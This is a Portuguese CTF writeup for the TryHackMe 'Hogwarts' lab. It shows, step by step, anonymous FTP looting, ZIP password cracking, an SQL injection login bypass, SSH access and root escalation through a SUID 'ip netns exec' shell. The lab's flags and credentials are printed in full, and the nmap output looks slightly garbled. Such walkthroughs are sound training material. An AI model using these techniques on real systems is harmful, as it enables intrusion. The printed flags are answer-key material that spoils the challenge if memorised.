# ⚡ CTF Hogwarts - Writeup Completo (TryHackMe)

**Data:** 27 de Abril de 2026  
**Alvo:** `10.10.212.163`  
**Atacante:** Murilo (root@ip-10-10-153-170)  
**Status:** PWNED (Privilégio Root Obtido)

---

## 1. Reconhecimento de Rede (Nmap)

O objetivo inicial foi mapear a superfície de ataque e identificar serviços em portas não convencionais.

**Comando:**
```bash
nmap -sV -sC -Pn -T4 -p- 10.10.212.163
```

**Resultado:**
```text
PORT      STATE SERVICE VERSION
22/tcp    open  http    Apache httpd 2.4.38 ((Debian))
9440/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10
9736/tcp  open  http    PHP cli server 5.5 or later
|_http-title: Hogwart's Royal Entry
10255/tcp open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
43768/tcp open  unknown
| last sighted in hogwa
```

**Raciocínio:**  
O scan revelou serviços críticos em portas altas. O FTP (10255) permitia login anônimo e a porta 9736 rodava um servidor PHP, indicando vetores de entrada via exfiltração e web.

---

## 2. Exploração de FTP e Exfiltração

Exploramos o FTP anônimo para buscar arquivos sensíveis. Encontramos diretórios ocultos usando nomes com múltiplos pontos (`...`).

**Comandos:**
```bash
ftp 10.10.212.163 10255
# Login: anonymous | Password: [vazio]

ftp> ls -la
ftp> get .IamHidden
ftp> cd ...
ftp> get GoAway.exe
ftp> cd ...
ftp> get .I_saved_it_harry.zip
ftp> get note4neville
```

**Análise dos Arquivos:**
```bash
cat note4neville
# Hagrid: Oi Neville even I ws able to open your secret file!

cat GoAway.exe
# Hagrid: Oh no harry, y'are steell poking injections around 'ere aren't ya?
```

**Raciocínio:**  
O arquivo `note4neville` sugeriu que Neville possuía segredos no servidor. Já o `GoAway.exe` continha uma dica direta de SQL Injection, apontando para a vulnerabilidade do serviço web.

---

## 3. Quebra de Criptografia do ZIP

O arquivo `.I_saved_it_harry.zip` estava protegido por senha. Realizamos brute-force no hash para extrair a credencial.

**Comandos:**
```bash
zip2john .I_saved_it_harry.zip > zip.hash

john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
# Resultado: anime (.I_saved_it_harry.zip/boot/.pass)

unzip .I_saved_it_harry.zip
# Senha: anime

cat boot/.pass
```

**Resultado:**
```text
neville:ocxxbwaznnkzkymq6m7tmdykv
```

**Raciocínio:**  
A quebra do hash revelou a senha `anime`. Com isso, exfiltramos a credencial de acesso SSH para o usuário `neville`.

---

## 4. Exploração Web (SQL Injection)

Acessamos o sistema de login na porta 9736. Com base na dica anterior ("injections"), aplicamos um payload de bypass.

**Payload de Login:**
- **User:** `admin`
- **Senha:** `admin' or '1'='1'#`

**Raciocínio:**  
A injeção `' or '1'='1'#` quebra a lógica da query SQL no backend, validando a autenticação sem uma senha real. O source code da página revelou flags e diálogos de lore (Snape/Dumbledore) sobre acessos ilegais a Hogwarts.

---

## 5. Acesso SSH e Escalação de Privilégio

Logamos no servidor via SSH na porta 9440 e buscamos vetores de privilégio local.

**Comando:**
```bash
ssh neville@10.10.212.163 -p 9440
# Password: ocxxbwaznnkzkymq6m7tmdykv
```

### Escalação via SUID (binário `ip`)

Identificamos o binário `/bin/ip` com permissão SUID e exploramos o uso de Network Namespaces.

```bash
neville@ip-10-10-212-163:~$ ip netns add foo
neville@ip-10-10-212-163:~$ ip netns exec foo /bin/sh -p
# whoami -> root
```

**Raciocínio:**  
O binário `ip` com o bit SUID permite a execução de comandos como Root. Ao criar um namespace de rede e executar `/bin/sh -p`, a shell herda o Effective UID do Root.

---

## 6. Captura Final de Flags

Com privilégios máximos, realizamos uma busca recursiva por todas as flags no formato padrão `THM{}`.

**Comando:**
```bash
grep -rE "THM\{|flag\{" /var /etc /opt /home /root /srv 2>/dev/null
```

**Resultados Encontrados:**
- **Hermione Flag:** `THM{its_wingardium_laviosaa_Ron}`
- **Harry Flag:** `THM{Yeah_1_swallowed_the_sn1tch.}`
- **Draco Flag:** `THM{I_unarm3d_dumbled0re}`
- **Web Config:** `THM{wait-for-your-letter!}`
- **Hidden Room:** `THM{That-boy-was-Tom-Riddle}`
- **Root Flag:** `THM{Albus_Perciva1_Wu1fric_Brian_Dumb1ed0re}`

**Final de Missão:** Hogwarts Pwned.
